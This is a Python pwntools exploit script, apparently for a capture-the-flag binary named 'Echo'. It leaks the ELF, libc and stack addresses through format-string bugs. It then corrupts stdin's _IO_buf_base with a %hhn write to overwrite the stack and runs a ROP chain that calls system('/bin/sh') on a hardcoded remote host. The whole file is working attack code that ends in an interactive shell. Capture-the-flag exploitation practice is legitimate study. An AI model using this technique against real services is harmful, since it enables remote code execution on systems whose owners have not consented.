#!/usr/bin/env python3
#-*- coding:utf-8 -*-
# Author: i0gan
# Env: Linux arch 5.8.14-arch1-1

from pwn import *
import os

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
s   =  lambda x : io.send(x)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
li  = lambda x : log.info('\x1b[01;38;5;214m' + x + '\x1b[0m')


context.log_level='debug'
context.terminal = ['tmux', 'splitw', '-h']

elf_path  = 'Echo'
MODIFY_LD = 0
arch = '64'
libc_v = '2.23'

ld_path   = '/glibc/' + libc_v + '/' + arch + '/lib/ld-linux-x86-64.so.2'
libs_path = '/glibc/' + libc_v + '/' + arch + '/lib'
libc_path = '/glibc/' + libc_v + '/' + arch + '/lib/libc.so.6'
libc_path = './libc.so.6'

# change ld path 
if(MODIFY_LD):
	os.system('cp ' + elf_path + ' ' + elf_path + '.bk')
	change_ld_cmd = 'patchelf  --set-interpreter ' + ld_path +' ' + elf_path
	os.system(change_ld_cmd)
	li('modify ld ok!')
	exit(0)

# remote server ip and port
server_ip = "121.36.216.253"
server_port = 10001

# if local debug
LOCAL = 0
LIBC  = 1


#--------------------------func-----------------------------
def db():
	if(LOCAL):
		gdb.attach(io)


#--------------------------exploit--------------------------
def exploit():
	li('exploit...')
	#leak elf
	sla('>>', '2')
	sla(':', '7')
	sl('%20$p')
	ru('0x')
	elf_base = int(r(12), 16) - (0x562a00b85150-  0x562a00b84000  )
	li('elf_base: ' + hex(elf_base))
	pop_rdi = elf_base + 0x11b3
	
	sla('>>', '2')
	sla(':', '7')
	sl('%21$p')
	ru('0x')
	libc_base = int(r(12), 16) - libc.sym['__libc_start_main'] - 240
	li('libc_base: ' + hex(libc_base))
	sys_addr = libc_base + libc.sym['system']
	sh_addr  = libc_base + 0x18ce17

	sla('>>', '2')
	sla(':', '7')
	sl('%23$p')
	ru('0x')
	stack_ret = int(r(12), 16) - 0xe0
	li('stack_ret: ' + hex(stack_ret))

	_IO_2_1_stdin_ = libc_base + libc.sym['_IO_2_1_stdin_']
	_IO_buf_base = _IO_2_1_stdin_ + 0x8 * 7
	li('_IO_buf_base: ' + hex(_IO_buf_base))


	sla('>>', str(1))
	p = p64(_IO_buf_base)
	sl(p)
	sla('>>', str(2))
	sla(':', str(7))
	#sl('%16$p')
	s('%16$hhn')


	p = p64(_IO_2_1_stdin_ + 0x83) * 3
	p += p64(stack_ret) + p64(stack_ret + 0x8 * 3)
	sla('>>', str(2))
	sa(':', p) #length:
	sl('')


	for i in range(0, len(p) - 1):
		sla('>>', str(2))
		sla(':', ',')
		sl(' ')


	sla('>>', str(2))
	p = p64(pop_rdi) + p64(sh_addr) + p64(sys_addr)
	sla(':', p) #length:
	sl('')

	#db()
	sla('>>', str(3))


def finish():
	ia()
	c()

#--------------------------main-----------------------------
if __name__ == '__main__':
	
	if LOCAL:
		elf = ELF(elf_path)
		if LIBC:
			libc = ELF(libc_path)
			io = elf.process(env= {"LD_PRELOAD" : libc_path} )
		else:
			io = elf.process()
	
	else:
		elf = ELF(elf_path)
		io = remote(server_ip, server_port)
		if LIBC:
			libc = ELF(libc_path)

	exploit()
	finish()
